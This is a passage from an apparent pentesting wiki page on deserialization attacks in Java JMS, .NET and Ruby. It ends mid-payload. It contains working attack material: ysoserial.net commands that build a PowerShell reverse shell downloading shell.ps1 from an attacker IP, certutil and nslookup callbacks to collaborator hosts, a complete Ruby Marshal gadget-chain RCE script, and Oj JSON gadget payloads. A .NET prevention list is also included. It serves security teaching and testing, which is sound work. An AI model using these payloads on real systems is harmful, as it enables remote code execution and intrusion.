href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></li> <li>Marshalsec paper: <a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true">https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true</a></li> <li><a href="https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr">https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr</a></li> <li><a href="https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html">https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</a></li> <li><a href="https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html">https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html</a></li> <li>Java and .Net JSON deserialization <strong>paper:</strong> <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf"><strong>https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</strong></a><strong>,</strong> talk: <a href="https://www.youtube.com/watch?v=oUAeWhW5b8c">https://www.youtube.com/watch?v=oUAeWhW5b8c</a> and slides: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li> <li>Deserialziations CVEs: <a href="https://paper.seebug.org/123/">https://paper.seebug.org/123/</a></li> </ul> <h2 id="jndi-injection--log4shell">JNDI Injection &amp; log4Shell</h2> <p>Find whats is <strong>JNDI Injection, how to abuse it via RMI, CORBA &amp; LDAP and how to exploit log4shell</strong> (and example of this vuln) in the following page:</p> <p>jndi-java-naming-and-directory-interface-and-log4shell.md</p> <h2 id="jms---java-message-service">JMS - Java Message Service</h2> <blockquote> <p>The <strong>Java Message Service</strong> (<strong>JMS</strong>) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From <a href="https://en.wikipedia.org/wiki/Java_Message_Service">Wikipedia</a>).</p> </blockquote> <h3 id="products">Products</h3> <p>There are several products using this middleware to send messages:</p> <p><img src="../../images/image (314).png" alt="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf"/></p> <p><img src="../../images/image (1056).png" alt="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf"/></p> <h3 id="exploitation">Exploitation</h3> <p>So, basically there are a <strong>bunch of services using JMS on a dangerous way</strong>. Therefore, if you have <strong>enough privileges</strong> to send messages to this services (usually you will need valid credentials) you could be able to send <strong>malicious objects serialized that will be deserialized by the consumer/subscriber</strong>.<br/> This means that in this exploitation all the <strong>clients that are going to use that message will get infected</strong>.</p> <p>You should remember that even if a service is vulnerable (because it’s insecurely deserializing user input) you still need to find valid gadgets to exploit the vulnerability.</p> <p>The tool <a href="https://github.com/matthiaskaiser/jmet">JMET</a> was created to <strong>connect and attack this services sending several malicious objects serialized using known gadgets</strong>. These exploits will work if the service is still vulnerable and if any of the used gadgets is inside the vulnerable application.</p> <h3 id="references-1">References</h3> <ul> <li>JMET talk: <a href="https://www.youtube.com/watch?v=0h8DWiOWGGA">https://www.youtube.com/watch?v=0h8DWiOWGGA</a></li> <li>Slides: <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf</a></li> </ul> <h2 id="net">.Net</h2> <p>In the context of .Net, deserialization exploits operate in a manner akin to those found in Java, where gadgets are exploited to run specific code during the deserialization of an object.</p> <h3 id="fingerprint">Fingerprint</h3> <h4 id="whitebox">WhiteBox</h4> <p>The source code should be inspected for occurrences of:</p> <ol> <li><code class="language-plaintext highlighter-rouge">TypeNameHandling</code></li> <li><code class="language-plaintext highlighter-rouge">JavaScriptTypeResolver</code></li> </ol> <p>The focus should be on serializers that permit the type to be determined by a variable under user control.</p> <h4 id="blackbox">BlackBox</h4> <p>The search should target the Base64 encoded string <strong>AAEAAAD/////</strong> or any similar pattern that might undergo deserialization on the server-side, granting control over the type to be deserialized. This could include, but is not limited to, <strong>JSON</strong> or <strong>XML</strong> structures featuring <code class="language-plaintext highlighter-rouge">TypeObject</code> or <code class="language-plaintext highlighter-rouge">$type</code>.</p> <h3 id="ysoserialnet">ysoserial.net</h3> <p>In this case you can use the tool <a href="https://github.com/pwntester/ysoserial.net"><strong>ysoserial.net</strong></a> in order to <strong>create the deserialization exploits</strong>. Once downloaded the git repository you should <strong>compile the tool</strong> using Visual Studio for example.</p> <p>If you want to learn about <strong>how does ysoserial.net creates it’s exploit</strong> you can <a href="basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md"><strong>check this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter</strong></a>.</p> <p>The main options of <strong>ysoserial.net</strong> are: <strong><code class="language-plaintext highlighter-rouge">--gadget</code></strong>, <strong><code class="language-plaintext highlighter-rouge">--formatter</code></strong>, <strong><code class="language-plaintext highlighter-rouge">--output</code></strong> and <strong><code class="language-plaintext highlighter-rouge">--plugin</code>.</strong></p> <ul> <li><strong><code class="language-plaintext highlighter-rouge">--gadget</code></strong> used to indicate the gadget to abuse (indicate the class/function that will be abused during deserialization to execute commands).</li> <li><strong><code class="language-plaintext highlighter-rouge">--formatter</code></strong>, used to indicated the method to serialized the exploit (you need to know which library is using the back-end to deserialize the payload and use the same to serialize it)</li> <li><strong><code class="language-plaintext highlighter-rouge">--output</code></strong> used to indicate if you want the exploit in <strong>raw</strong> or <strong>base64</strong> encoded. <em>Note that <strong>ysoserial.net</strong> will <strong>encode</strong> the payload using <strong>UTF-16LE</strong> (encoding used by default on Windows) so if you get the raw and just encode it from a linux console you might have some <strong>encoding compatibility problems</strong> that will prevent the exploit from working properly (in HTB JSON box the payload worked in both UTF-16LE and ASCII but this doesn’t mean it will always work).</em></li> <li><strong><code class="language-plaintext highlighter-rouge">--plugin</code></strong> ysoserial.net supports plugins to craft <strong>exploits for specific frameworks</strong> like ViewState</li> </ul> <h4 id="more-ysoserialnet-parameters">More ysoserial.net parameters</h4> <ul> <li><code class="language-plaintext highlighter-rouge">--minify</code> will provide a <strong>smaller payload</strong> (if possible)</li> <li><code class="language-plaintext highlighter-rouge">--raf -f Json.Net -c "anything"</code> This will indicate all the gadgets that can be used with a provided formatter (<code class="language-plaintext highlighter-rouge">Json.Net</code> in this case)</li> <li><code class="language-plaintext highlighter-rouge">--sf xml</code> you can <strong>indicate a gadget</strong> (<code class="language-plaintext highlighter-rouge">-g</code>)and ysoserial.net will search for formatters containing “xml” (case insensitive)</li> </ul> <p><strong>ysoserial examples</strong> to create exploits:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Send ping</span>
ysoserial.exe <span class="nt">-g</span> ObjectDataProvider <span class="nt">-f</span> Json.Net <span class="nt">-c</span> <span class="s2">"ping -n 5 10.10.14.44"</span> <span class="nt">-o</span> <span class="nb">base64</span>

<span class="c">#Timing</span>
<span class="c">#I tried using ping and timeout but there wasn't any difference in the response timing from the web server</span>

<span class="c">#DNS/HTTP request</span>
ysoserial.exe <span class="nt">-g</span> ObjectDataProvider <span class="nt">-f</span> Json.Net <span class="nt">-c</span> <span class="s2">"nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net"</span> <span class="nt">-o</span> <span class="nb">base64
</span>ysoserial.exe <span class="nt">-g</span> ObjectDataProvider <span class="nt">-f</span> Json.Net <span class="nt">-c</span> <span class="s2">"certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a"</span> <span class="nt">-o</span> <span class="nb">base64</span>

<span class="c">#Reverse shell</span>
<span class="c">#Create shell command in linux</span>
<span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')"</span> | iconv  <span class="nt">-t</span> UTF-16LE | <span class="nb">base64</span> <span class="nt">-w0</span>
<span class="c">#Create exploit using the created B64 shellcode</span>
ysoserial.exe <span class="nt">-g</span> ObjectDataProvider <span class="nt">-f</span> Json.Net <span class="nt">-c</span> <span class="s2">"powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA="</span> <span class="nt">-o</span> <span class="nb">base64</span>
</code></pre></div></div> <p><strong>ysoserial.net</strong> has also a <strong>very interesting parameter</strong> that helps to understand better how every exploit works: <code class="language-plaintext highlighter-rouge">--test</code><br/> If you indicates this parameter <strong>ysoserial.net</strong> will <strong>try</strong> the <strong>exploit locally,</strong> so you can test if your payload will work correctly.<br/> This parameter is helpful because if you review the code you will find chucks of code like the following one (from <a href="https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208">ObjectDataProviderGenerator.cs</a>):</p> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">if</span> <span class="o">(</span><span class="n">inputArgs</span><span class="o">.</span><span class="na">Test</span><span class="o">)</span>
                <span class="o">{</span>
                    <span class="k">try</span>
                    <span class="o">{</span>
                        <span class="nc">SerializersHelper</span><span class="o">.</span><span class="na">JsonNet_deserialize</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
                    <span class="o">}</span>
                    <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">err</span><span class="o">)</span>
                    <span class="o">{</span>
                        <span class="nc">Debugging</span><span class="o">.</span><span class="na">ShowErrors</span><span class="o">(</span><span class="n">inputArgs</span><span class="o">,</span> <span class="n">err</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>
</code></pre></div></div> <p>This means that in order to test the exploit the code will call <a href="https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539">serializersHelper.JsonNet_deserialize</a></p> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="n">object</span> <span class="nf">JsonNet_deserialize</span><span class="o">(</span><span class="n">string</span> <span class="n">str</span><span class="o">)</span>
    <span class="o">{</span>
        <span class="nc">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="nc">JsonConvert</span><span class="o">.</span><span class="na">DeserializeObject</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;(</span><span class="n">str</span><span class="o">,</span> <span class="k">new</span> <span class="nc">JsonSerializerSettings</span>
        <span class="o">{</span>
            <span class="nc">TypeNameHandling</span> <span class="o">=</span> <span class="nc">TypeNameHandling</span><span class="o">.</span><span class="na">Auto</span>
        <span class="o">});</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div></div> <p>In the <strong>previous code is vulnerable to the exploit created</strong>. So if you find something similar in a .Net application it means that probably that application is vulnerable too.<br/> Therefore the <strong><code class="language-plaintext highlighter-rouge">--test</code></strong> parameter allows us to understand <strong>which chunks of code are vulnerable</strong> to the desrialization exploit that <strong>ysoserial.net</strong> can create.</p> <h3 id="viewstate">ViewState</h3> <p>Take a look to <a href="exploiting-__viewstate-parameter.md">this POST about <strong>how to try to exploit the __ViewState parameter of .Net</strong> </a>to <strong>execute arbitrary code.</strong> If you <strong>already know the secrets</strong> used by the victim machine, <a href="exploiting-__viewstate-knowing-the-secret.md"><strong>read this post to know to execute code</strong></a><strong>.</strong></p> <h3 id="prevention-1">Prevention</h3> <p>To mitigate the risks associated with deserialization in .Net:</p> <ul> <li><strong>Avoid allowing data streams to define their object types.</strong> Utilize <code class="language-plaintext highlighter-rouge">DataContractSerializer</code> or <code class="language-plaintext highlighter-rouge">XmlSerializer</code> when possible.</li> <li><strong>For <code class="language-plaintext highlighter-rouge">JSON.Net</code>, set <code class="language-plaintext highlighter-rouge">TypeNameHandling</code> to <code class="language-plaintext highlighter-rouge">None</code>:</strong> %%%TypeNameHandling = TypeNameHandling.None%%%</li> <li><strong>Avoid using <code class="language-plaintext highlighter-rouge">JavaScriptSerializer</code> with a <code class="language-plaintext highlighter-rouge">JavaScriptTypeResolver</code>.</strong></li> <li><strong>Limit the types that can be deserialized</strong>, understanding the inherent risks with .Net types, such as <code class="language-plaintext highlighter-rouge">System.IO.FileInfo</code>, which can modify server files’ properties, potentially leading to denial of service attacks.</li> <li><strong>Be cautious with types having risky properties</strong>, like <code class="language-plaintext highlighter-rouge">System.ComponentModel.DataAnnotations.ValidationException</code> with its <code class="language-plaintext highlighter-rouge">Value</code> property, which can be exploited.</li> <li><strong>Securely control type instantiation</strong> to prevent attackers from influencing the deserialization process, rendering even <code class="language-plaintext highlighter-rouge">DataContractSerializer</code> or <code class="language-plaintext highlighter-rouge">XmlSerializer</code> vulnerable.</li> <li><strong>Implement white list controls</strong> using a custom <code class="language-plaintext highlighter-rouge">SerializationBinder</code> for <code class="language-plaintext highlighter-rouge">BinaryFormatter</code> and <code class="language-plaintext highlighter-rouge">JSON.Net</code>.</li> <li><strong>Stay informed about known insecure deserialization gadgets</strong> within .Net and ensure deserializers do not instantiate such types.</li> <li><strong>Isolate potentially risky code</strong> from code with internet access to avoid exposing known gadgets, such as <code class="language-plaintext highlighter-rouge">System.Windows.Data.ObjectDataProvider</code> in WPF applications, to untrusted data sources.</li> </ul> <h3 id="references-2"><strong>References</strong></h3> <ul> <li>Java and .Net JSON deserialization <strong>paper:</strong> <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf"><strong>https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</strong></a><strong>,</strong> talk: <a href="https://www.youtube.com/watch?v=oUAeWhW5b8c">https://www.youtube.com/watch?v=oUAeWhW5b8c</a> and slides: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li> <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp">https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp</a></li> <li><a href="https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf">https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf</a></li> <li><a href="https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization">https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization</a></li> </ul> <h2 id="ruby"><strong>Ruby</strong></h2> <p>In Ruby, serialization is facilitated by two methods within the <strong>marshal</strong> library. The first method, known as <strong>dump</strong>, is used to transform an object into a byte stream. This process is referred to as serialization. Conversely, the second method, <strong>load</strong>, is employed to revert a byte stream back into an object, a process known as deserialization.</p> <p>For securing serialized objects, <strong>Ruby employs HMAC (Hash-Based Message Authentication Code)</strong>, ensuring the integrity and authenticity of the data. The key utilized for this purpose is stored in one of several possible locations:</p> <ul> <li><code class="language-plaintext highlighter-rouge">config/environment.rb</code></li> <li><code class="language-plaintext highlighter-rouge">config/initializers/secret_token.rb</code></li> <li><code class="language-plaintext highlighter-rouge">config/secrets.yml</code></li> <li><code class="language-plaintext highlighter-rouge">/proc/self/environ</code></li> </ul> <p><strong>Ruby 2.X generic deserialization to RCE gadget chain (more info in</strong> <a href="https://www.elttam.com/blog/ruby-deserialization/"><strong>https://www.elttam.com/blog/ruby-deserialization/</strong></a><strong>)</strong>:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env ruby</span>

<span class="c1"># Code from https://www.elttam.com/blog/ruby-deserialization/</span>

<span class="k">class</span> <span class="nc">Gem::StubSpecification</span>
  <span class="k">def</span> <span class="nf">initialize</span><span class="p">;</span> <span class="k">end</span>
<span class="k">end</span>


<span class="n">stub_specification</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">StubSpecification</span><span class="p">.</span><span class="nf">new</span>
<span class="n">stub_specification</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="ss">:@loaded_from</span><span class="p">,</span> <span class="s2">"|id 1&gt;&amp;2"</span><span class="p">)</span><span class="c1">#RCE cmd must start with "|" and end with "1&gt;&amp;2"</span>

<span class="nb">puts</span> <span class="s2">"STEP n"</span>
<span class="n">stub_specification</span><span class="p">.</span><span class="nf">name</span> <span class="k">rescue</span> <span class="kp">nil</span>
<span class="nb">puts</span>


<span class="k">class</span> <span class="nc">Gem::Source::SpecificFile</span>
  <span class="k">def</span> <span class="nf">initialize</span><span class="p">;</span> <span class="k">end</span>
<span class="k">end</span>

<span class="n">specific_file</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Source</span><span class="o">::</span><span class="no">SpecificFile</span><span class="p">.</span><span class="nf">new</span>
<span class="n">specific_file</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="ss">:@spec</span><span class="p">,</span> <span class="n">stub_specification</span><span class="p">)</span>

<span class="n">other_specific_file</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Source</span><span class="o">::</span><span class="no">SpecificFile</span><span class="p">.</span><span class="nf">new</span>

<span class="nb">puts</span> <span class="s2">"STEP n-1"</span>
<span class="n">specific_file</span> <span class="o">&lt;=&gt;</span> <span class="n">other_specific_file</span> <span class="k">rescue</span> <span class="kp">nil</span>
<span class="nb">puts</span>


<span class="vg">$dependency_list</span><span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">DependencyList</span><span class="p">.</span><span class="nf">new</span>
<span class="vg">$dependency_list</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="ss">:@specs</span><span class="p">,</span> <span class="p">[</span><span class="n">specific_file</span><span class="p">,</span> <span class="n">other_specific_file</span><span class="p">])</span>

<span class="nb">puts</span> <span class="s2">"STEP n-2"</span>
<span class="vg">$dependency_list</span><span class="p">.</span><span class="nf">each</span><span class="p">{}</span> <span class="k">rescue</span> <span class="kp">nil</span>
<span class="nb">puts</span>


<span class="k">class</span> <span class="nc">Gem::Requirement</span>
  <span class="k">def</span> <span class="nf">marshal_dump</span>
    <span class="p">[</span><span class="vg">$dependency_list</span><span class="p">]</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="p">.</span><span class="nf">new</span><span class="p">)</span>

<span class="nb">puts</span> <span class="s2">"STEP n-3"</span>
<span class="no">Marshal</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="k">rescue</span> <span class="kp">nil</span>
<span class="nb">puts</span>


<span class="nb">puts</span> <span class="s2">"VALIDATION (in fresh ruby process):"</span>
<span class="no">IO</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="s2">"ruby -e 'Marshal.load(STDIN.read) rescue nil'"</span><span class="p">,</span> <span class="s2">"r+"</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">pipe</span><span class="o">|</span>
  <span class="n">pipe</span><span class="p">.</span><span class="nf">print</span> <span class="n">payload</span>
  <span class="n">pipe</span><span class="p">.</span><span class="nf">close_write</span>
  <span class="nb">puts</span> <span class="n">pipe</span><span class="p">.</span><span class="nf">gets</span>
  <span class="nb">puts</span>
<span class="k">end</span>

<span class="nb">puts</span> <span class="s2">"Payload (hex):"</span>
<span class="nb">puts</span> <span class="n">payload</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'H*'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<span class="nb">puts</span>


<span class="nb">require</span> <span class="s2">"base64"</span>
<span class="nb">puts</span> <span class="s2">"Payload (Base64 encoded):"</span>
<span class="nb">puts</span> <span class="no">Base64</span><span class="p">.</span><span class="nf">encode64</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div> <p>Other RCE chain to exploit Ruby On Rails: <a href="https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/">https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/</a></p> <h3 id="ruby-send-method">Ruby .send() method</h3> <p>As explained in <a href="https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/"><strong>this vulnerability report</strong></a>, if some user unsanitized input reaches the <code class="language-plaintext highlighter-rouge">.send()</code> method of a ruby object, this method allows to <strong>invoke any other method</strong> of the object with any parameters.</p> <p>For example, calling eval and then ruby code as second parameter will allow to execute arbitrary code:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="no">Object</span><span class="o">&gt;</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="s1">'eval'</span><span class="p">,</span> <span class="s1">'&lt;user input with Ruby code&gt;'</span><span class="p">)</span> <span class="o">==</span> <span class="no">RCE</span>
</code></pre></div></div> <p>Moreover, if only one parameter of <strong><code class="language-plaintext highlighter-rouge">.send()</code></strong> is controlled by an attacker, as mentioned in the previous writeup, it’s possible to call any method of the object that <strong>doesn’t need arguments</strong> or whose arguments have <strong>default values</strong>.<br/> For this, it’s possible to enumerate all the methods of the object to <strong>find some interesting methods that fulfil those requirements</strong>.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="no">Object</span><span class="o">&gt;</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="s1">'&lt;user_input&gt;'</span><span class="p">)</span>

<span class="c1"># This code is taken from the original blog post</span>
<span class="c1"># &lt;Object&gt; in this case is Repository</span>
<span class="c1">## Find methods with those requirements</span>
<span class="n">repo</span> <span class="o">=</span> <span class="no">Repository</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># get first repo</span>
<span class="n">repo_methods</span> <span class="o">=</span> <span class="p">[</span>           <span class="c1"># get names of all methods accessible by Repository object</span>
  <span class="n">repo</span><span class="p">.</span><span class="nf">public_methods</span><span class="p">(),</span>
  <span class="n">repo</span><span class="p">.</span><span class="nf">private_methods</span><span class="p">(),</span>
  <span class="n">repo</span><span class="p">.</span><span class="nf">protected_methods</span><span class="p">(),</span>
<span class="p">].</span><span class="nf">flatten</span><span class="p">()</span>

<span class="n">repo_methods</span><span class="p">.</span><span class="nf">length</span><span class="p">()</span>      <span class="c1"># Initial number of methods =&gt; 5542</span>

<span class="c1">## Filter by the arguments requirements</span>
<span class="n">candidate_methods</span> <span class="o">=</span> <span class="n">repo_methods</span><span class="p">.</span><span class="nf">select</span><span class="p">()</span> <span class="k">do</span> <span class="o">|</span><span class="n">method_name</span><span class="o">|</span>
  <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">include?</span><span class="p">(</span><span class="n">repo</span><span class="p">.</span><span class="nf">method</span><span class="p">(</span><span class="n">method_name</span><span class="p">).</span><span class="nf">arity</span><span class="p">())</span>
<span class="k">end</span>
<span class="n">candidate_methods</span><span class="p">.</span><span class="nf">length</span><span class="p">()</span> <span class="c1"># Final number of methods=&gt; 3595</span>
</code></pre></div></div> <h3 id="ruby-class-pollution">Ruby class pollution</h3> <p>Check how it could be possible to <a href="ruby-class-pollution.md">pollute a Ruby class and abuse it in here</a>.</p> <h3 id="ruby-_json-pollution">Ruby _json pollution</h3> <p>When sending in a body some values not hashabled like an array they will be added into a new key called <code class="language-plaintext highlighter-rouge">_json</code>. However, It’s possible for an attacker to also set in the body a value called <code class="language-plaintext highlighter-rouge">_json</code> with the arbitrary values he wishes. Then, If the backend for example checks the veracity of a parameter but then also uses the <code class="language-plaintext highlighter-rouge">_json</code> parameter to perform some action, an authorisation bypass could be performed.</p> <p>Check more information in the <a href="ruby-_json-pollution.md">Ruby _json pollution page</a>.</p> <h3 id="other-libraries">Other libraries</h3> <p>This technique was taken<a href="https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared"> <strong>from this blog post</strong></a>.</p> <p>There are other Ruby libraries that can be used to serialize objects and therefore that could be abused to gain RCE during an insecure deserialization. The following table shows some of these libraries and the method they called of the loaded library whenever it’s unserialized (function to abuse to get RCE basically):</p> <table data-header-hidden=""><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Library</strong></td><td><strong>Input data</strong></td><td><strong>Kick-off method inside class</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br/><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table> <p>Basic example:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Existing Ruby class inside the code of the app</span>
<span class="k">class</span> <span class="nc">SimpleClass</span>
  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="vi">@cmd</span> <span class="o">=</span> <span class="n">cmd</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">hash</span>
    <span class="nb">system</span><span class="p">(</span><span class="vi">@cmd</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="c1"># Exploit</span>
<span class="nb">require</span> <span class="s1">'oj'</span>
<span class="n">simple</span> <span class="o">=</span> <span class="no">SimpleClass</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"open -a calculator"</span><span class="p">)</span> <span class="c1"># command for macOS</span>
<span class="n">json_payload</span> <span class="o">=</span> <span class="no">Oj</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span>
<span class="nb">puts</span> <span class="n">json_payload</span>

<span class="c1"># Sink vulnerable inside the code accepting user input as json_payload</span>
<span class="no">Oj</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="n">json_payload</span><span class="p">)</span>
</code></pre></div></div> <p>In the case of trying to abuse Oj, it was possible to find a gadget class that inside its <code class="language-plaintext highlighter-rouge">hash</code> function will call <code class="language-plaintext highlighter-rouge">to_s</code>, which will call spec, which will call fetch_path which was possible to make it fetch a random URL, giving a great detector of these kind of unsanitized deserialization vulnerabilities.</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"^o"</span><span class="p">:</span><span class="w"> </span><span class="s2">"URI::HTTP"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"scheme"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"host"</span><span class="p">:</span><span class="w"> </span><span class="s2">"example.org/anyurl?"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"port"</span><span class="p">:</span><span class="w"> </span><span class="s2">"anyport"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"anyuser"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"anypw"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <p>Moreover, it was found that with the previous technique a folder is also created in the system, which is a requirement to abuse another gadget in order to transform this into a complete RCE with something like:</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"^o"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Gem::Resolver::SpecSpecification"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"spec"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
